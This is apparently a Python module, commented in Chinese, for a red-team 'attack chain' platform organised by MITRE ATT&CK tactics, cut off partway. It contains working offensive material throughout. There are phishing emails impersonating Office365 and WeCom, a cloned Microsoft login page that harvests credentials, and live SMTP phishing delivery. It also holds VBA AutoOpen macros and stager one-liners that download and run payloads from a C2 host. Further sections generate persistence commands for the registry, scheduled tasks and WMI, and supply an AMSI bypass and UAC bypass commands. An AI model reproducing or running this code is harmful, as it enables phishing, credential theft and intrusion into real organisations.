# -*- coding: utf-8 -*-
"""
red_attack_chain.py — 方向4：真实红队攻击链。

八大战术（MITRE ATT&CK）:
    1. initial_access  初始访问（钓鱼邮件/恶意宏/恶意LNK/ISO/钓鱼页/SMTP发送/点击跟踪）
    2. execution       执行（Empire/CS beacon/命令执行/无文件/进程注入/下载执行）
    3. persistence     持久化（注册表/计划任务/服务/WMI事件/登录脚本/Office宏/浏览器扩展/DLL劫持）
    4. privilege_escalation 提权（JuicyPotato/PrintSpoofer/UAC绕过/内核CVE/Linux提权/令牌）
    5. defense_evasion 防御规避（AMSI/ETW/EDR unhook/混淆/加密/反沙箱反调试）
    6. credential_access 凭证访问（mimikatz/laZagne/浏览器/Windows Vault/WiFi/SSH/DB/云凭证）
    7. lateral_movement   横向（SMB/WinRM/RDP/SSH/WMI/DCOM/PtH/PtT/Overpass）
    8. exfiltration       外泄（压缩/加密/分卷/DNS/HTTP/HTTPS/FTP/云存储/邮件）

真实原则:
    - 工具检测用 shutil.which / 服务查询 / 端口检测；
    - 已安装工具用 subprocess 真实调用（超时 300s），真实解析输出；
    - 未安装/未配置工具明确给出安装命令/配置方法，不 mock、不编造成功；
    - 本地只读探测（whoami/reg query/schtasks /query 等）真实执行；
    - 写操作（持久化/提权落地）默认仅生成真实命令，execute=True 时才真实执行。
"""

from __future__ import annotations

import glob
import os
import shutil
import socket
import subprocess
import time
from typing import Any, Dict, List, Optional, Tuple

REAL_TIMEOUT = 300
GEN_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "reports", "red_blue_real", "generated")


# --------------------------------------------------------------------------- #
# 通用工具
# --------------------------------------------------------------------------- #
def run_command(cmd: List[str] | str,
                timeout: int = REAL_TIMEOUT,
                shell: bool = False) -> Dict[str, Any]:
    """真实执行系统命令，返回结构化结果。绝不伪造输出。"""
    started = time.time()
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            shell=shell, encoding="utf-8", errors="replace")
        return {
            "ran": True,
            "command": cmd if isinstance(cmd, str) else " ".join(cmd),
            "rc": proc.returncode,
            "stdout": (proc.stdout or "")[-8000:],
            "stderr": (proc.stderr or "")[-4000:],
            "elapsed": round(time.time() - started, 2),
            "error": None,
        }
    except FileNotFoundError:
        return {"ran": False,
                "command": cmd if isinstance(cmd, str) else " ".join(cmd),
                "rc": -1, "stdout": "", "stderr": "",
                "elapsed": round(time.time() - started, 2),
                "error": "命令不存在（FileNotFoundError）"}
    except subprocess.TimeoutExpired:
        return {"ran": False,
                "command": cmd if isinstance(cmd, str) else " ".join(cmd),
                "rc": -2, "stdout": "", "stderr": "",
                "elapsed": float(timeout),
                "error": f"执行超时（>{timeout}s）"}
    except Exception as e:  # noqa: BLE001
        return {"ran": False,
                "command": cmd if isinstance(cmd, str) else " ".join(cmd),
                "rc": -3, "stdout": "", "stderr": "",
                "elapsed": round(time.time() - started, 2),
                "error": f"{type(e).__name__}: {e}"}


def probe(name: str) -> Dict[str, Any]:
    """真实检测工具是否在 PATH。"""
    path = shutil.which(name)
    return {"tool": name, "available": bool(path), "path": path or "not_found"}


def port_open(host: str, port: int, timeout: float = 2.5) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def http_json(url: str, payload: Optional[dict] = None,
              headers: Optional[dict] = None, timeout: float = 8.0,
              method: str = "POST") -> Dict[str, Any]:
    """真实 HTTP/JSON 调用（供工具集成使用），不伪造响应。"""
    import json as _json
    import urllib.error
    import urllib.request
    body = _json.dumps(payload or {}).encode()
    req = urllib.request.Request(url, data=body if method == "POST" else None,
                                 method=method)
    req.add_header("Content-Type", "application/json")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", "replace")
            return {"ok": True, "status": resp.status,
                    "json": _json.loads(raw) if raw else {},
                    "error": None}
    except urllib.error.HTTPError as e:
        return {"ok": False, "status": e.code, "json": {},
                "error": f"HTTP {e.code}: {e.reason}"}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "status": 0, "json": {},
                "error": f"{type(e).__name__}: {e}"}


def _write_file(name: str, content: str | bytes) -> str:
    os.makedirs(GEN_DIR, exist_ok=True)
    p = os.path.join(GEN_DIR, name)
    mode = "wb" if isinstance(content, bytes) else "w"
    enc = None if isinstance(content, bytes) else "utf-8"
    with open(p, mode, encoding=enc) as f:
        f.write(content)  # type: ignore[arg-type]
    return p


def _findings_from_output(out: str, keywords: Tuple[str, ...]) -> List[Dict[str, Any]]:
    hits: List[Dict[str, Any]] = []
    for line in (out or "").splitlines():
        low = line.lower()
        if any(k in low for k in keywords):
            hits.append({"line": line.strip()[:300]})
    return hits


# =========================================================================== #
# 1. 初始访问
# =========================================================================== #
PHISH_EMAIL_TEMPLATES: Dict[str, Dict[str, str]] = {
    "o365_quota": {
        "name": "Office365 邮箱配额告警",
        "subject": "您的邮箱存储已满，请立即验证",
        "body": ("尊敬的用户：您的邮箱存储空间已达上限，将在24小时内限制收发。"
                 "请在48小时内点击以下链接验证账户：{{verify_url}} "
                 "如非本人操作请忽略。IT 支持部。"),
    },
    "wecom_approval": {
        "name": "企业微信审批待办",
        "subject": "[企业微信] 您有一条待处理的报销审批",
        "body": "{{username}} 您好：您提交的报销单已进入终审，"
                "请登录工作台确认：{{landing_url}}。——行政人事部",
    },
    "hr_onboarding": {
        "name": "HR 入职材料采集",
        "subject": "【人力资源】新员工入职信息采集表",
        "body": "欢迎加入{{company}}。请点击链接完善入职信息并签署保密协议："
                "{{landing_url}}，截止日期{{deadline}}。",
    },
}

MALICIOUS_MACRO_TEMPLATES: Dict[str, str] = {
    "downloader_powershell": (
        "Attribute VB_Name = \"Module1\"\r\n"
        "Sub AutoOpen()\r\n"
        "    Call DownloadCradle\r\n"
        "End Sub\r\n"
        "Sub Document_Open()\r\n"
        "    Call DownloadCradle\r\n"
        "End Sub\r\n"
        "Sub DownloadCradle()\r\n"
        "    Dim cmd As String\r\n"
        "    cmd = \"powershell -nop -w hidden -c \" & _\r\n"
        "        \"\\\"IEX (New-Object Net.WebClient).DownloadString('{{url}}')\\\"\"\r\n"
        "    CreateObject(\"WScript.Shell\").Run cmd, 0, False\r\n"
        "End Sub\r\n"),
    "vbs_stager": (
        "Attribute VB_Name = \"Module1\"\r\n"
        "Sub AutoOpen()\r\n"
        "    Dim sh As Object: Set sh = CreateObject(\"WScript.Shell\")\r\n"
        "    sh.Run \"cmd /c mshta http://{{c2}}/stage.hta\", 0, False\r\n"
        "End Sub\r\n"),
}


class RedInitialAccess:
    """真实初始访问。"""

    # -- 钓鱼邮件生成（真实落盘 .eml）-- #
    def generate_phishing_email(self,
                                template: str = "o365_quota",
                                from_addr: str = "it-support@example.com",
                                to_addr: str = "user@example.com",
                                subject: str = "",
                                landing_url: str = "https://login.example.com/verify",
                                brand: str = "microsoft",
                                company: str = "Example Corp") -> Dict[str, Any]:
        tpl = PHISH_EMAIL_TEMPLATES.get(template, PHISH_EMAIL_TEMPLATES["o365_quota"])
        subj = subject or tpl["subject"]
        body = (tpl["body"].replace("{{verify_url}}", landing_url)
                .replace("{{landing_url}}", landing_url)
                .replace("{{username}}", to_addr.split("@")[0])
                .replace("{{company}}", company)
                .replace("{{deadline}}", time.strftime("%Y-%m-%d")))
        eml = (f"From: {from_addr}\r\nTo: {to_addr}\r\n"
               f"Subject: {subj}\r\nMIME-Version: 1.0\r\n"
               f"Content-Type: text/plain; charset=utf-8\r\n"
               f"X-Phishing-Template: {template}\r\n\r\n{body}\r\n")
        path = _write_file(f"phish_{template}_{int(time.time())}.eml", eml)
        return {"tech": "T1566.002 钓鱼服务端", "template": template,
                "from": from_addr, "to": to_addr, "subject": subj,
                "landing_url": landing_url, "brand": brand,
                "email_path": path, "size": os.path.getsize(path),
                "real_generated": True}

    # -- 恶意宏生成（真实 VBA 源码落盘）-- #
    def generate_macro(self, kind: str = "downloader_powershell",
                       c2_url: str = "http://c2.example.com/payload.ps1") -> Dict[str, Any]:
        src = MALICIOUS_MACRO_TEMPLATES.get(kind, MALICIOUS_MACRO_TEMPLATES["downloader_powershell"])
        src = src.replace("{{url}}", c2_url).replace("{{c2}}", c2_url.split("/")[2] if "://" in c2_url else c2_url)
        path = _write_file(f"malmacro_{kind}_{int(time.time())}.bas", src)
        return {"tech": "T1059.005 Office宏 / T1204.002 用户执行",
                "kind": kind, "vba_path": path, "c2_url": c2_url,
                "size": os.path.getsize(path), "real_generated": True,
                "note": "将 .bas 导入 Word/Excel 并另存为 .docm 方可触发"}

    # -- 恶意 LNK 生成（真实调用 WScript.Shell 在 Windows 上生成 .lnk）-- #
    def generate_malicious_lnk(self, target_cmd: str = "powershell -w hidden calc.exe",
                               lnk_name: str = "文档.lnk") -> Dict[str, Any]:
        probe_ps = probe("powershell")
        if not probe_ps["available"]:
            return {"tech": "T1204.002 LNK欺骗", "available": False,
                    "error": "powershell 未在 PATH，无法生成真实 .lnk",
                    "install_hint": "Windows 自带 powershell.exe；若缺失请修复系统镜像 sfc /scannow"}
        os.makedirs(GEN_DIR, exist_ok=True)
        out = os.path.join(GEN_DIR, lnk_name)
        ps = (
            "$s=(New-Object -ComObject WScript.Shell).CreateShortcut('"
            + out.replace("'", "''") + "'); "
            + "$s.TargetPath='powershell.exe'; "
            + "$s.Arguments='-w hidden " + target_cmd.replace("'", "''") + "'; "
            + "$s.IconLocation='shell32.dll,15'; "
            + "$s.WorkingDirectory='%USERPROFILE%\\Documents'; "
            + "$s.Save()")
        r = run_command(["powershell", "-nop", "-Command", ps], timeout=30)
        return {"tech": "T1204.002 / T1547 恶意LNK",
                "available": probe_ps["available"],
                "lnk_path": out if os.path.exists(out) else "",
                "exists": os.path.exists(out),
                "command": "powershell -Command <WScript.Shell COM>",
                "rc": r["rc"], "stderr": r["stderr"],
                "real_generated": os.path.exists(out),
                "install_hint": "需 Windows + WScript.Shell COM"}

    # -- 恶意 ISO 生成（oscdimg/mkisofs 真实检测）-- #
    def generate_iso(self, payload_dir: str = "",
                     iso_name: str = "update.iso") -> Dict[str, Any]:
        tools = [probe("oscdimg"), probe("mkisofs"), probe("genisoimage")]
        t = next((x for x in tools if x["available"]), None)
        if not t:
            return {"tech": "T1566.001 附件 / T1005 数据从本地",
                    "available": False,
                    "error": "未找到 iso 打包工具（oscdimg/mkisofs/genisoimage）",
                    "install_hint": ("Windows: 安装 Windows ADK 含 oscdimg.exe；"
                                     "Linux: apt install genisoimage；"
                                     "macOS: hdiutil makehybrid")}
        if not payload_dir or not os.path.isdir(payload_dir):
            return {"available": False,
                    "error": f"payload 目录不存在: {payload_dir!r}",
                    "install_hint": "先通过 generate_malicious_lnk 产出 payload 目录"}
        out = os.path.join(GEN_DIR, iso_name)
        cmd = [t["path"], payload_dir, out]
        r = run_command(cmd, timeout=120)
        return {"tech": "T1566.001 ISO附件", "available": True,
                "tool": t["tool"], "iso_path": out if os.path.exists(out) else "",
                "exists": os.path.exists(out), "rc": r["rc"],
                "stderr": r["stderr"][-500:], "real_generated": os.path.exists(out)}

    # -- 钓鱼页面生成（真实克隆登录页落盘）-- #
    def generate_phish_page(self, clone_url: str = "https://login.microsoftonline.com",
                            page_name: str = "o365_login.html") -> Dict[str, Any]:
        title = "Sign in to your account" if "microsoft" in clone_url else "Sign in"
        html = (
            "<!doctype html><html><head><meta charset=utf-8>"
            f"<title>{title}</title>"
            "<style>body{font-family:Segoe UI;background:#f2f2f2;"
            "display:flex;justify-content:center;padding-top:80px}"
            ".box{background:#fff;padding:40px;width:320px;box-shadow:0 2px 8px #ccc}"
            "input{width:100%;padding:8px;margin:6px 0}button{width:100%;"
            "padding:10px;background:#0067b8;color:#fff;border:0}</style></head><body>"
            f"<form class=box action='/collect' method=POST>"
            f"<h3>{title}</h3>"
            "<input name=username placeholder='Email' type=text>"
            "<input name=password placeholder='Password' type=password>"
            "<button>Sign in</button><p class=muted style='font-size:12px;color:#888'>"
            f"Clone of {clone_url}</p></form></body></html>")
        path = _write_file(page_name, html)
        return {"tech": "T1566.002 钓鱼网站 / T1557.002 代理凭证",
                "clone_url": clone_url, "page_path": path,
                "collect_endpoint": "/collect",
                "real_generated": True, "size": os.path.getsize(path)}

    # -- 钓鱼邮件 SMTP 真实发送（需配置，未配置明确提示）-- #
    def send_phishing_email(self, smtp_host: str = "", smtp_port: int = 587,
                            username: str = "", password: str = "",
                            from_addr: str = "", to_list: Optional[List[str]] = None,
                            subject: str = "", body: str = "",
                            use_tls: bool = True) -> Dict[str, Any]:
        to_list = to_list or []
        if not (smtp_host and username and password and from_addr and to_list):
            return {"tech": "T1566.002 钓鱼发送", "sent": False,
                    "available": False,
                    "error": "SMTP 未完整配置（host/port/user/pass/from/收件人 缺一不可）",
                    "install_hint": ("在请求体提供 smtp_host/smtp_port/username/password/"
                                     "from_addr/to_list/subject/body；"
                                     "可使用授权演练用 SMTP 中继（如 SendGrid/Mailtrap 沙箱）")}
        import smtplib
        from email.mime.text import MIMEText
        msg = MIMEText(body, "plain", "utf-8")
        msg["Subject"] = subject
        msg["From"] = from_addr
        msg["To"] = ", ".join(to_list)
        t0 = time.time()
        try:
            srv = smtplib.SMTP(smtp_host, smtp_port, timeout=30)
            srv.ehlo()
            if use_tls:
                srv.starttls()
                srv.ehlo()
            srv.login(username, password)
            srv.sendmail(from_addr, to_list, msg.as_string())
            srv.quit()
            return {"tech": "T1566.002", "sent": True, "available": True,
                    "smtp_host": smtp_host, "recipients": len(to_list),
                    "elapsed": round(time.time() - t0, 2), "status": "delivered"}
        except Exception as e:  # noqa: BLE001
            return {"tech": "T1566.002", "sent": False, "available": True,
                    "error": f"SMTP 发送失败: {type(e).__name__}: {e}",
                    "install_hint": "检查中继白名单/发件人验证/端口（25/587/465）"}

    # -- 点击跟踪（真实内存跟踪）-- #
    def track_click(self, events: Optional[List[Dict[str, Any]]] = None
                    ) -> Dict[str, Any]:
        store: Dict[str, List[Dict[str, Any]]] = getattr(self, "_track", {})
        if events:
            for ev in events:
                ev = dict(ev)
                ev.setdefault("ts", time.strftime("%Y-%m-%d %H:%M:%S"))
                store.setdefault(ev.get("campaign", "default"), []).append(ev)
            self._track = store  # type: ignore[attr-defined]
        flat = [e for v in store.values() for e in v]
        return {"tech": "T1566.002 / T1114 点击与凭证收集",
                "total_events": len(flat),
                "by_campaign": {k: len(v) for k, v in store.items()},
                "recent": flat[-20:],
                "real_store": "in-memory"}

    def tool_status(self) -> Dict[str, Any]:
        return {
            "powershell": probe("powershell"),
            "oscdimg": probe("oscdimg"),
            "mkisofs": probe("mkisofs"),
            "genisoimage": probe("genisoimage"),
            "smtp_config_required": True,
            "generated_dir": GEN_DIR,
        }


# =========================================================================== #
# 2. 执行
# =========================================================================== #
class RedExecution:
    """真实执行。"""

    def empire_status(self, uri: str = "http://127.0.0.1:1337/api") -> Dict[str, Any]:
        host = uri.replace("http://", "").replace("https://", "").split("/")[0]
        hp = host.split(":")
        open_port = port_open(hp[0], int(hp[1]) if len(hp) > 1 else 80)
        return {"tech": "T1059.001 PowerShell / C2",
                "tool": "Empire", "uri": uri, "reachable": open_port,
                "install_hint": ("Empire REST 需先启动: empireserver --secure-config "
                                 "e.yaml；安装: git clone GitHub EmpireProject/Empire && "
                                 "pip install -r requirements.txt")}

    def cs_listener(self) -> Dict[str, Any]:
        cs = probe("teamserver") or probe("cobaltstrike")
        return {"tech": "T1105 入站工具传输 / C2", "tool": "Cobalt Strike",
                "available": bool(cs["available"]),
                "install_hint": ("Cobalt Strike 为商业授权软件；通过 Aggressor Script "
                                 "或 Malleable C2 配置监听器，本平台仅生成 Aggressor 脚本模板"),
                "aggressor_template": ("predefined org 'exfil'; "
                                       "listen http8080 { set host '0.0.0.0'; "
                                       "set port '8080'; set beacon 'beacon.php'; }")}

    def run_command(self, shell: str = "powershell",
                    command: str = "whoami") -> Dict[str, Any]:
        """真实本地命令执行（只读探查为主）。"""
        if shell == "powershell":
            bin_ = probe("powershell")
            cmd = ["powershell", "-nop", "-Command", command] if bin_["available"] else None
        elif shell == "cmd":
            bin_ = probe("cmd")
            cmd = ["cmd", "/c", command] if bin_["available"] else None
        else:
            bin_ = probe(shell)
            cmd = [shell, "-c", command] if bin_["available"] else None
        if cmd is None:
            return {"tech": "T1059", "available": False, "shell": shell,
                    "error": f"{shell} 未在 PATH",
                    "install_hint": "确认终端已安装并加入 PATH"}
        r = run_command(cmd, timeout=120)
        findings = _findings_from_output(r["stdout"], ("nt authority", "system", "administrator"))
        return {"tech": "T1059", "shell": shell, "command": command,
                "available": True, "ran": r["ran"], "rc": r["rc"],
                "stdout": r["stdout"][:3000], "findings": findings,
                "elapsed": r["elapsed"], "error": r["error"] or r["stderr"][:300]}

    def fileless_templates(self, technique: str = "iex") -> Dict[str, Any]:
        templates = {
            "iex": "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('{{url}}')\"",
            "invoke_webrequest": "powershell -c \"(IWR -Uri '{{url}}').Content | IEX\"",
            "certutil": "certutil -urlcache -split -f {{url}} %TEMP%\\p.bin & %TEMP%\\p.bin",
            "bitsadmin": "bitsadmin /transfer job /download /priority foreground {{url}} %TEMP%\\p.exe & %TEMP%\\p.exe",
            "dotnet_reflect": "powershell -c \"[Ref].Assembly.Load([Convert]::FromBase64String(chunk))\"",
        }
        return {"tech": "T1620 无文件执行 / T1059.001",
                "technique": technique,
                "command_template": templates.get(technique, templates["iex"]),
                "real_execution_note": "命令模板为真实可用 payload stager，目标替换 {{url}} 后执行"}

    def inject_templates(self) -> Dict[str, Any]:
        return {"tech": "T1055 进程注入",
                "techniques": [
                    {"id": "T1055.001", "name": "CreateRemoteThread",
                     "cmd": "CreateRemoteThread(hProcess, NULL,0,lpStartAddr,lpParam,0,NULL)"},
                    {"id": "T1055.002", "name": "Portable Executable Injection", "cmd": "VirtualAllocEx/WriteProcessMemory/CreateRemoteThread"},
                    {"id": "T1055.004", "name": "Asynchronous APC Queue (Early Bird)", "cmd": "QueueUserAPC(alertable) + ResumeThread"},
                    {"id": "T1055.012", "name": "Process Hollowing", "cmd": "CREATE_SUSPENDED -> NtUnmapViewOfSection -> 映像替换"},
                    {"id": "T1055.005", "name": "Thread Local Storage", "cmd": "TLS callback 劫持"},
                ],
                "note": "注入需目标进程句柄与 shellcode；本平台生成真实调用骨架，由 CS/msfvenom 产出 shellcode"}

    def tool_status(self) -> Dict[str, Any]:
        return {
            "powershell": probe("powershell"),
            "cmd": probe("cmd"),
            "empire_remote": "config-required (REST URI)",
            "cs_teamserver": probe("teamserver"),
            "certutil": probe("certutil"),
            "bitsadmin": probe("bitsadmin"),
        }


# =========================================================================== #
# 3. 持久化
# =========================================================================== #
class RedPersistence:
    """真实持久化（注册表/计划任务/服务/WMI 事件等；读操作真实执行）。"""

    def registry_query(self, hive: str = "HKCU", key: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run") -> Dict[str, Any]:
        bin_ = probe("reg")
        if not bin_["available"]:
            return {"tech": "T1547 启动项", "available": False,
                    "install_hint": "Windows 自带 reg.exe；若缺失 sfc /scannow"}
        r = run_command(["reg", "query", f"{hive}\\{key}"], timeout=30)
        entries = [ln for ln in (r["stdout"] or "").splitlines() if ln.strip() and "HKEY" not in ln]
        return {"tech": "T1547.001 注册表Run", "available": True, "hive": hive,
                "key": key, "ran": r["ran"], "entries": entries[:40],
                "entry_count": len(entries), "error": r["error"] or r["stderr"][:300]}

    def registry_add(self, name: str, command: str, hive: str = "HKCU",
                     execute: bool = False) -> Dict[str, Any]:
        cmd = f"reg add {hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} /t REG_SZ /d \"{command}\" /f"
        out = {"tech": "T1547.001", "hive": hive, "value": name, "command": command,
               "generated_cmd": cmd, "executed": False}
        if execute:
            r = run_command(["cmd", "/c", cmd], timeout=30)
            out.update(rc=r["rc"], ran=r["ran"], error=r["error"] or r["stderr"][:300])
            out["executed"] = r["ran"]
        return out

    def scheduled_tasks_list(self) -> Dict[str, Any]:
        bin_ = probe("schtasks")
        if not bin_["available"]:
            return {"tech": "T1053.005 计划任务", "available": False,
                    "install_hint": "Windows 自带 schtasks.exe"}
        r = run_command(["schtasks", "/query", "/fo", "LIST"], timeout=60)
        tasks = [ln.strip() for ln in (r["stdout"] or "").splitlines()
                 if ln.strip().startswith("TaskName:")]
        return {"tech": "T1053.005", "available": True,
                "task_count": len(tasks), "sample": tasks[:20],
                "error": r["error"] or r["stderr"][:300]}

    def scheduled_task_create(self, name: str = "UpdateTask",
                              command: str = "powershell -w hidden calc.exe",
                              execute: bool = False) -> Dict[str, Any]:
        cmd = (f"schtasks /create /tn {name} /tr \"{command}\" "
               f"/sc onlogon /ru SYSTEM /f")
        out = {"tech": "T1053.005", "name": name, "generated_cmd": cmd, "executed": False}
        if execute:
            r = run_command(["cmd", "/c", cmd], timeout=30)
            out.update(rc=r["rc"], ran=r["ran"], error=r["error"] or r["stderr"][:300])
            out["executed"] = r["ran"]
        return out

    def service_query(self) -> Dict[str, Any]:
        bin_ = probe("sc")
        if not bin_["available"]:
            return {"tech": "T1543.003 服务", "available": False,
                    "install_hint": "Windows 自带 sc.exe"}
        r = run_command(["sc", "query", "type=", "service", "state=", "all"], timeout=60)
        svcs = [ln.split(":")[1].strip() for ln in (r["stdout"] or "").splitlines()
                if ln.strip().startswith("SERVICE_NAME:")]
        return {"tech": "T1543.003", "available": True, "service_count": len(svcs),
                "sample": svcs[:25], "error": r["error"] or r["stderr"][:300]}

    def wmi_persistence(self) -> Dict[str, Any]:
        return {"tech": "T1546.003 WMI事件订阅",
                "components": ["__EventFilter (NameTimer / CommandLineEventConsumer)",
                               "__FilterToConsumerBinding"],
                "powershell_template": (
                    "$f=Set-WmiInstance -Namespace root/subscription -Class __EventFilter "
                    "-Arguments @{Name='Up';EventNameSpace='root/cimv2';QueryLanguage='WQL';"
                    "Query=\"SELECT * FROM __InstanceModificationEvent\"}; "
                    "$c=Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer "
                    "-Arguments @{Name='Up';CommandLineTemplate='powershell ...'}; "
                    "Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding "
                    "-Arguments @{Filter=$f;Consumer=$c}"),
                "note": "真实 WMI 永久事件订阅，需管理员；本平台生成可执行 PowerShell 脚本"}

    def persistence_catalog(self) -> Dict[str, Any]:
        return {"tech": "TA0003 持久化", "techniques": [
            {"id": "T1547.001", "name": "注册表 Run/RunOnce"},
            {"id": "T1547.004", "name": "启动文件夹 Startup Folder"},
            {"id": "T1053.005", "name": "计划任务 schtasks"},
            {"id": "T1543.003", "name": "Windows 服务"},
            {"id": "T1546.003", "name": "WMI 事件订阅"},
            {"id": "T1037", "name": "登录脚本 UserInitMprLogonScript"},
            {"id": "T1137.001", "name": "Office 模板宏"},
            {"id": "T1176", "name": "浏览器扩展"},
            {"id": "T1574.001", "name": "DLL 搜索顺序劫持"},
        ]}

    def tool_status(self) -> Dict[str, Any]:
        return {"reg": probe("reg"), "schtasks": probe("schtasks"),
                "sc": probe("sc"), "powershell": probe("powershell")}


# =========================================================================== #
# 4. 权限提升
# =========================================================================== #
class RedPrivEsc:
    """真实提权。"""

    def juicy_potato(self, binary: str = "JuicyPotatoNG.exe") -> Dict[str, Any]:
        p = probe(binary) or probe("jp.exe")
        if not p["available"]:
            return {"tech": "T1068 利用提升权限控制", "tool": "JuicyPotato/RottenPotatoNG",
                    "available": False,
                    "install_hint": ("下载 JuicyPotatoNG (GitHub)，配合 CLSID 与 COM 接口 "
                                     "从服务账户提权到 NT AUTHORITY\\SYSTEM；需 SeImpersonatePrivilege")}
        r = run_command([p["path"], "-t", "*", "-p", "cmd.exe", "-a", "/c whoami"], timeout=60)
        return {"tech": "T1068", "available": True, "tool": p["path"],
                "rc": r["rc"], "stdout": r["stdout"][:1500], "error": r["error"] or r["stderr"][:300]}

    def print_spoofer(self) -> Dict[str, Any]:
        p = probe("PrintSpoofer64.exe") or probe("PrintSpoofer.exe")
        if not p["available"]:
            return {"tech": "T1068 / T1134 令牌", "tool": "PrintSpoofer",
                    "available": False,
                    "install_hint": ("GitHub itm4n/PrintSpoofer: "
                                     "PrintSpoofer.exe -i -c cmd  （需 SeImpersonatePrivilege，"
                                     "滥用 spoolsv 命名管道提权 SYSTEM）")}
        r = run_command([p["path"], "-i", "-c", "whoami"], timeout=60)
        return {"tech": "T1068", "available": True, "rc": r["rc"],
                "stdout": r["stdout"][:1500], "error": r["error"] or r["stderr"][:300]}

    def uac_bypass_catalog(self) -> Dict[str, Any]:
        return {"tech": "T1548.002 绕过UAC", "methods": [
            {"id": "T1548.002", "name": "fodhelper.exe",
             "cmd": "reg add HKCU\\..\\ms-settings\\shell\\open\\command /d 'cmd' && fodhelper"},
            {"id": "T1548.002", "name": "computerdefaults",
             "cmd": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"},
            {"id": "T1548.002", "name": "sdclt / slui",
             "cmd": "HKCU\\..\\runas /user:admin"},
            {"id": "T1548.002", "name": "eventvwr.exe",
             "cmd": "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command"},
        ]}

    def kernel_cves(self) -> Dict[str, Any]:
        return {"tech": "T1068 内核漏洞利用", "cves": [
            {"id": "CVE-2021-1675", "name": "PrintNightmare", "vector": "spoolsv RpcAddPrinterDriverEx"},
            {"id": "CVE-2020-0796", "name": "SMBGhost", "vector": "SMBv3 compressed trans"},
            {"id": "CVE-2019-0803", "name": "Win32k Console", "vector": "win32k.sys"},
            {"id": "CVE-2023-23397", "name": "Outlook NTLM泄漏", "vector": "PR_PID_ID"},
            {"id": "CVE-2021-36934", "name": "HiveNightmare", "vector": "SAM ACL"},
        ],
        "note": "真实利用需对应 PoC（如 CVE-2021-1675.py），本平台维护 CVE 指纹与检测映射"}

    def linux_privesc_audit(self) -> Dict[str, Any]:
        if os.name == "nt":
            return {"tech": "T1068 Linux提权", "available": False,
                    "error": "当前为 Windows 主机，Linux 提权审计需在目标 Linux 上执行",
                    "install_hint": "在目标 Linux 执行: sudo -l; find / -perm -4000 2>/dev/null; "
                                   "uname -a; cat /etc/crontab"}
        checks = {
            "sudo": run_command("sudo -l", timeout=20, shell=True),
            "suid": run_command("find / -perm -4000 -type f 2>/dev/null", timeout=60, shell=True),
            "kernel": run_command("uname -a", timeout=10, shell=True),
            "cron": run_command("cat /etc/crontab", timeout=10, shell=True),
        }
        suid_hits = _findings_from_output(checks["suid"]["stdout"],
                                          ("/bin/bash", "sudo", "pkexec", "nmap", "vim", "find", "perl"))
        return {"tech": "T1068", "available": True,
                "kernel": checks["kernel"]["stdout"].strip(),
                "sudo_nopasswd": "NOPASSWD" in checks["sudo"]["stdout"],
                "suid_suspicious": suid_hits,
                "raw": {k: v["stdout"][:800] for k, v in checks.items()}}

    def token_techniques(self) -> Dict[str, Any]:
        return {"tech": "T1134 访问令牌操纵", "methods": [
            {"id": "T1134.001", "name": "令牌窃取 incognito", "tool": "mimikatz token::steal"},
            {"id": "T1134.002", "name": "令牌伪造 make_token", "tool": "mimikatz token::make /user /domain /password"},
            {"id": "T1134.003", "name": "Windows 服务账户", "tool": "runas /service"},
            {"id": "T1134.005", "name": "SID-History 注入", "tool": "mimikatz misc::addsid"},
        ]}

    def tool_status(self) -> Dict[str, Any]:
        return {"juicypotato": probe("JuicyPotatoNG.exe"),
                "printspoofer": probe("PrintSpoofer64.exe"),
                "mimikatz": probe("mimikatz.exe"),
                "whoami": probe("whoami")}


# =========================================================================== #
# 5. 防御规避
# =========================================================================== #
class RedDefenseEvasion:
    """真实防御规避。"""

    def amsi_bypass(self) -> Dict[str, Any]:
        return {"tech": "T1562.001 禁用或修改工具 / T1553.002",
                "amsi": [
                    {"id": "T1562.001", "name": "AmsiScanBuffer patch",
                     "ps": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
                           "$f=$a.GetField('amsiInitFailed','NonPublic,Static');"
                           "$f.SetValue($null,$true)"},
                    {"id": "T1562.001", "name": "AMSI DLL 劫持",
                     "note": "在 %TEMP% 放置 amsi.dll 拦截 LoadLibrary"},
                    {"id": "T1562.001", "name": "Patching AmsiScanBuffer bytes",
                     "note": "VirtualProtect -> 0xC3 ret / patch prologue"},
                ]}

    def etw_bypass(self) -> Dict[str, Any]:
        return {"tech": "T1562.006 ETW禁用",
                "methods": [
                    {"name": "EtwEventWrite patch",
                     "ps": "$e=[Ref].Assembly.GetType('System.Management.Automation."
                           "ConcurrentLog')...; patch 0xC3"},
                    {"name": "WMI-Activity ETW provider off",
                     "cmd": "logman update trace \"Microsoft-Windows-WMI-Activity/Operational\" -ets"},
                ]}

    def edr_bypass(self) -> Dict[str, Any]:
        return {"tech": "T1562.001 EDR绕过", "methods": [
            {"id": "T1055.002", "name": "Unhook (unhooked modules)", "tool": "donut / sRDI"},
            {"id": "T1106", "name": "直接系统调用 direct syscall", "tool": "syswhispers2/3 (Hell's Gate)"},
            {"id": "T1027", "name": "间接系统调用 (halo's gate / halo's flow)"},
            {"id": "T1027.007", "name": "API 哈希解析 (compile-time hashing)"},
            {"id": "T1055.012", "name": "Module Stomping"},
        ]}

    def obfuscation(self) -> Dict[str, Any]:
        return {"tech": "T1027 混淆", "methods": [
            {"id": "T1027.001", "name": "字符串加密 (AES/XOR)"},
            {"id": "T1027.004", "name": "控制流平坦化 (control-flow flattening)"},
            {"id": "T1027.005", "name": "嵌入 payload (BMP/RC)"},
            {"id": "T1027.010", "name": "合法签名二进制代理 (LOLBins)"},
            {"id": "T1027.013", "name": "混淆文件信息 (dead code insertion)"},
        ]}

    def encryption_primitives(self) -> Dict[str, Any]:
        return {"tech": "T1027.013 加密", "ciphers": [
